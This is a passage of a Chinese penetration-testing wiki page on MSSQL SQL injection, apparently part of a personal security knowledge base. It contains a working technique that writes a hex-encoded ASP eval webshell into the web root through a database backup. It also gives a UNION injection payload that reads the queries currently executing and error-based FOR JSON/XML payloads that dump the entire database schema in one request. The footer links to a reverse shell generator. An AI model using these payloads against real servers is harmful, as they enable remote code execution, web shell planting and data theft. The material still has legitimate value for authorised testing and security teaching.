</span><span class="token keyword" style="color:#00009f">into</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">test</span><span class="token punctuation" style="color:#393A34">]</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">cmd</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">values</span><span class="token punctuation" style="color:#393A34">(</span><span class="token number" style="color:#36acaa">0x3c256576616c20726571756573742822636d642229253e</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">backup</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">database</span><span class="token plain"> test </span><span class="token keyword" style="color:#00009f">to</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">disk</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&#x27;C:\Inetpub\wwwroot\1.asp&#x27;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">Drop</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">table</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">test</span><span class="token punctuation" style="color:#393A34">]</span><br></span></code></pre></div></div>
<p><img decoding="async" loading="lazy" alt="image.png" src="/assets/images/1632310999426-b74f7052-80c8-4ba0-a43b-39471de8133b-11724a31ed0ea618f90e03356851e0ad.png" width="1021" height="557" class="img_ev3q"></p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="技巧">技巧<a href="#技巧" class="hash-link" aria-label="技巧的直接链接" title="技巧的直接链接">​</a></h2>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="查询当前执行的sql语句">查询当前执行的SQL语句<a href="#查询当前执行的sql语句" class="hash-link" aria-label="查询当前执行的SQL语句的直接链接" title="查询当前执行的SQL语句的直接链接">​</a></h3>
<p>可以从<code>Access sys.dm_exec_Requests</code>和<code>sys.dm_exec_sql_text</code>中检索当前正在执行的SQL查询</p>
<p>**权限：**如果user在服务器上拥有<code>VIEW SERVER STATE</code>权限，则用户将看到SQL Server实例上正在执行的所有会话；否则，user将仅看到当前会话。</p>
<div class="language-sql codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-sql codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">id</span><span class="token operator" style="color:#393A34">=</span><span class="token operator" style="color:#393A34">-</span><span class="token number" style="color:#36acaa">2</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">union</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">all</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">select</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&#x27;1&#x27;</span><span class="token punctuation" style="color:#393A34">,</span><span class="token string" style="color:#e3116c">&#x27;2&#x27;</span><span class="token punctuation" style="color:#393A34">,</span><span class="token punctuation" style="color:#393A34">(</span><span class="token keyword" style="color:#00009f">select</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">text</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">from</span><span class="token plain"> sys</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">dm_exec_requests </span><span class="token keyword" style="color:#00009f">cross</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">apply</span><span class="token plain"> sys</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">dm_exec_sql_text</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">sql_handle</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">,</span><span class="token string" style="color:#e3116c">&#x27;4&#x27;</span><br></span></code></pre></div></div>
<p><img decoding="async" loading="lazy" alt="image-20211223162609078" src="/assets/images/image-20211223162609078-fa19bf8c3d1e14a8fe43370593799835.png" width="1968" height="442" class="img_ev3q"></p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="一次查询获取所有内容">一次查询获取所有内容<a href="#一次查询获取所有内容" class="hash-link" aria-label="一次查询获取所有内容的直接链接" title="一次查询获取所有内容的直接链接">​</a></h3>
<p>有两种简单的方法可以在一个查询中检索表的全部内容-使用<code>FOR XML</code>或<code>FOR JSON</code>子句。</p>
<p>FOR XML子句需要指定的模式，如«raw»，因此JSON比较简洁。</p>
<div class="language-sql codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-sql codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token comment" style="color:#999988;font-style:italic">-- 基于正常查询</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">select</span><span class="token plain"> concat_ws</span><span class="token punctuation" style="color:#393A34">(</span><span class="token number" style="color:#36acaa">0x3a</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain">table_schema</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain">table_name</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain">column_name</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">from</span><span class="token plain"> information_schema</span><span class="token punctuation" style="color:#393A34">.</span><span class="token keyword" style="color:#00009f">columns</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">for</span><span class="token plain"> json auto</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">select</span><span class="token plain"> name</span><span class="token punctuation" style="color:#393A34">,</span><span class="token string" style="color:#e3116c">&#x27;,&#x27;</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">from</span><span class="token plain"> master</span><span class="token punctuation" style="color:#393A34">.</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">sysdatabases </span><span class="token keyword" style="color:#00009f">for</span><span class="token plain"> xml path</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">&#x27;&#x27;</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic">-- 基于报错</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token operator" style="color:#393A34">and</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">1</span><span class="token operator" style="color:#393A34">=</span><span class="token punctuation" style="color:#393A34">(</span><span class="token keyword" style="color:#00009f">select</span><span class="token plain"> concat_ws</span><span class="token punctuation" style="color:#393A34">(</span><span class="token number" style="color:#36acaa">0x3a</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain">table_schema</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain">table_name</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain">column_name</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain">a </span><span class="token keyword" style="color:#00009f">from</span><span class="token plain"> information_schema</span><span class="token punctuation" style="color:#393A34">.</span><span class="token keyword" style="color:#00009f">columns</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">for</span><span class="token plain"> json auto</span><span class="token punctuation" style="color:#393A34">)</span><br></span></code></pre></div></div></div><footer class="theme-doc-footer docusaurus-mt-lg"><div class="row margin-top--sm theme-doc-footer-edit-meta-row"><div class="col"></div><div class="col lastUpdated_JAkA"><span class="theme-last-updated">最后<!-- -->由 <b>d4m1ts</b> <!-- -->于 <b><time datetime="2025-06-01T13:27:30.000Z" itemprop="dateModified">2025年6月1日</time></b> <!-- -->更新</span></div></div></footer></article><nav class="pagination-nav" aria-label="文件选项卡"><a class="pagination-nav__link pagination-nav__link--prev" href="/docs/渗透测试/WEB漏洞/SQL注入/MSSQL/常用符号:函数:语句归类"><div class="pagination-nav__sublabel">上一页</div><div class="pagination-nav__label">常用符号:函数:语句归类</div></a><a class="pagination-nav__link pagination-nav__link--next" href="/docs/渗透测试/WEB漏洞/SQL注入/MSSQL/绕过技巧"><div class="pagination-nav__sublabel">下一页</div><div class="pagination-nav__label">绕过技巧</div></a></nav></div></div><div class="col col--3"><div class="tableOfContents_bqdL thin-scrollbar theme-doc-toc-desktop"><ul class="table-of-contents table-of-contents__left-border"><li><a href="#前情提要" class="table-of-contents__link toc-highlight">前情提要</a></li><li><a href="#联合查询union注入" class="table-of-contents__link toc-highlight">联合查询(UNION)注入</a><ul><li><a href="#概念" class="table-of-contents__link toc-highlight">概念</a></li><li><a href="#注意" class="table-of-contents__link toc-highlight">注意</a></li><li><a href="#注入流程" class="table-of-contents__link toc-highlight">注入流程</a><ul><li><a href="#确认字段" class="table-of-contents__link toc-highlight">确认字段</a></li><li><a href="#确认显位" class="table-of-contents__link toc-highlight">确认显位</a></li><li><a href="#查询数据" class="table-of-contents__link toc-highlight">查询数据</a></li></ul></li><li><a href="#总结" class="table-of-contents__link toc-highlight">总结</a></li></ul></li><li><a href="#报错注入" class="table-of-contents__link toc-highlight">报错注入</a><ul><li><a href="#概念-1" class="table-of-contents__link toc-highlight">概念</a></li><li><a href="#注入举例" class="table-of-contents__link toc-highlight">注入举例</a></li><li><a href="#报错函数" class="table-of-contents__link toc-highlight">报错函数</a><ul><li><a href="#convert" class="table-of-contents__link toc-highlight">convert()</a></li><li><a href="#cast" class="table-of-contents__link toc-highlight">cast()</a></li><li><a href="#除法" class="table-of-contents__link toc-highlight">除法</a></li><li><a href="#--" class="table-of-contents__link toc-highlight">&gt; &lt; =</a></li><li><a href="#db_name" class="table-of-contents__link toc-highlight">db_name()</a></li><li><a href="#file_name" class="table-of-contents__link toc-highlight">file_name()</a></li><li><a href="#filegroup_name" class="table-of-contents__link toc-highlight">filegroup_name()</a></li><li><a href="#col_name" class="table-of-contents__link toc-highlight">col_name()</a></li><li><a href="#object_name" class="table-of-contents__link toc-highlight">object_name()</a></li><li><a href="#type_name" class="table-of-contents__link toc-highlight">type_name()</a></li><li><a href="#schema_name" class="table-of-contents__link toc-highlight">schema_name()</a></li><li><a href="#其他函数" class="table-of-contents__link toc-highlight">其他函数</a></li><li><a href="#having-11-爆表名" class="table-of-contents__link toc-highlight">having 1=1 爆表名</a></li><li><a href="#group-by--having-11-爆列名" class="table-of-contents__link toc-highlight">group by ... having 1=1 爆列名</a></li></ul></li></ul></li><li><a href="#盲注" class="table-of-contents__link toc-highlight">盲注</a><ul><li><a href="#布尔盲注" class="table-of-contents__link toc-highlight">布尔盲注</a><ul><li><a href="#注入判断" class="table-of-contents__link toc-highlight">注入判断</a></li><li><a href="#常用函数" class="table-of-contents__link toc-highlight">常用函数</a></li><li><a href="#注入举例-1" class="table-of-contents__link toc-highlight">注入举例</a></li></ul></li><li><a href="#时间盲注" class="table-of-contents__link toc-highlight">时间盲注</a><ul><li><a href="#注入判断-1" class="table-of-contents__link toc-highlight">注入判断</a></li><li><a href="#常用函数-1" class="table-of-contents__link toc-highlight">常用函数</a></li><li><a href="#注入举例-2" class="table-of-contents__link toc-highlight">注入举例</a></li></ul></li></ul></li><li><a href="#dns带外oob注入" class="table-of-contents__link toc-highlight">DNS带外(OOB)注入</a><ul><li><a href="#概念-2" class="table-of-contents__link toc-highlight">概念</a></li><li><a href="#利用举例" class="table-of-contents__link toc-highlight">利用举例</a></li></ul></li><li><a href="#堆叠注入" class="table-of-contents__link toc-highlight">堆叠注入</a></li><li><a href="#order-by-注入" class="table-of-contents__link toc-highlight">Order by 注入</a><ul><li><a href="#概念-3" class="table-of-contents__link toc-highlight">概念</a></li><li><a href="#注入判断-2" class="table-of-contents__link toc-highlight">注入判断</a></li><li><a href="#注入举例-3" class="table-of-contents__link toc-highlight">注入举例</a><ul><li><a href="#开启报错" class="table-of-contents__link toc-highlight">开启报错</a></li><li><a href="#关闭报错" class="table-of-contents__link toc-highlight">关闭报错</a></li></ul></li></ul></li><li><a href="#二次注入" class="table-of-contents__link toc-highlight">二次注入</a></li><li><a href="#文件读写" class="table-of-contents__link toc-highlight">文件读写</a><ul><li><a href="#概述" class="table-of-contents__link toc-highlight">概述</a></li><li><a href="#读" class="table-of-contents__link toc-highlight">读</a></li><li><a href="#写" class="table-of-contents__link toc-highlight">写</a></li><li><a href="#db_owner权限log备份getshell" class="table-of-contents__link toc-highlight">DB_owner权限LOG备份Getshell</a></li><li><a href="#db_owner权限差异备份getshell" class="table-of-contents__link toc-highlight">DB_owner权限差异备份Getshell</a></li></ul></li><li><a href="#技巧" class="table-of-contents__link toc-highlight">技巧</a><ul><li><a href="#查询当前执行的sql语句" class="table-of-contents__link toc-highlight">查询当前执行的SQL语句</a></li><li><a href="#一次查询获取所有内容" class="table-of-contents__link toc-highlight">一次查询获取所有内容</a></li></ul></li></ul></div></div></div></div></main></div></div></div><footer class="theme-layout-footer footer footer--dark"><div class="container container-fluid"><div class="row footer__links"><div class="theme-layout-footer-column col footer__col"><div class="footer__title">内容导航</div><ul class="footer__items clean-list"><li class="footer__item"><a class="footer__link-item" href="/friends">友情链接</a></li><li class="footer__item"><a class="footer__link-item" href="/promotions">我的推广</a></li></ul></div><div class="theme-layout-footer-column col footer__col"><div class="footer__title">实用工具</div><ul class="footer__items clean-list"><li class="footer__item"><a href="https://markdown.gm7.org/" target="_blank" rel="noopener noreferrer" class="footer__link-item">在线Markdown<svg width="13.5" height="13.5" aria-hidden="true" class="iconExternalLink_nPIU"><use href="#theme-svg-external-link"></use></svg></a></li><li class="footer__item"><a href="https://rshell.gm7.org/" target="_blank" rel="noopener noreferrer" class="footer__link-item">Reverse Shell Generator<svg width="13.5" height="13.5" aria-hidden="true" class="iconExternalLink_nPIU"><use href="#theme-svg-external-link"></use></svg></a></li><li class="footer__item"><a href="https://gtfobins.gm7.org/" target="_blank" rel="noopener noreferrer" class="footer__link-item">GTFOBins<svg width="13.5" height="13.5" aria-hidden="true" class="iconExternalLink_nPIU"><use href="#theme-svg-external-link"></use></svg></a></li></ul></div><div class="theme-layout-footer-column col footer__col"><div class="footer__title">关注我</div><ul class="footer__items clean-list"><li class="footer__item"><a href="https://github.com/damit5/damit5.github.io" target="_blank" rel="noopener noreferrer" class="footer__link-item">GitHub<svg width="13.5" height="13.5" aria-hidden="true" class="iconExternalLink_nPIU"><use href="#theme-svg-external-link"></use></svg></a></li><li class="footer__item"><a href="mailto:admin@gm7.org" target="_blank" rel="noopener noreferrer" class="footer__link-item">联系我<svg width="13.5" height="13.5" aria-hidden="true" class="iconExternalLink_nPIU"><use href="#theme-svg-external-link"></use></svg></a></li></ul></div></div><div class="footer__bottom text--center"><div class="footer__copyright">Copyright © 2025 d4m1ts 知识库</div></div></div></footer></div>
</body>
</html>